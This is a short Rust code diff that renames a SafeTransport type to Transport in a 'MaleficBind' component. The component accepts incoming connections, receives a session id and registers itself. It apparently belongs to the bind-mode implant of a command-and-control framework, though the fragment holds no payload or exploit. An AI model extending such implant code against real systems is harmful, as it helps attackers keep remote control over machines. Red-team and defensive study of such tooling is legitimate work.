@@ -1,7 +1,6 @@
 use malefic_core::config;
-use malefic_core::transport::{Client, listener::Listener, SafeTransport};
+use malefic_core::transport::{Client, Transport, Listener, ListenerExt};
 use malefic_proto::crypto::{new_cryptor};
-use malefic_core::transport::listener::ListenerExt;
 use malefic_helper::debug;
 use malefic_proto::marshal_one;
 use crate::stub::{MaleficStub};
@@ -35,7 +34,7 @@ impl MaleficBind {
         }
     }
     
-    pub async fn init(&mut self, transport: SafeTransport) -> anyhow::Result<()> {
+    pub async fn init(&mut self, transport: Transport) -> anyhow::Result<()> {
         let init = self.client.recv(transport.clone()).await?;
         self.stub.meta.set_id(init.session_id);
         let data = marshal_one(init.session_id, self.stub.register_spite())?;
@@ -53,7 +52,7 @@ impl MaleficBind {
         loop {
             match self.listener.accept().await {
                 Ok(transport) => {
-                    let transport = SafeTransport::new(transport);
+                    let transport = Transport::new(transport);
                     if !self.initialize {
                         self.init(transport).await.map_err(|e| {
                             debug!("[bind] Failed to init: {:#?}", e);
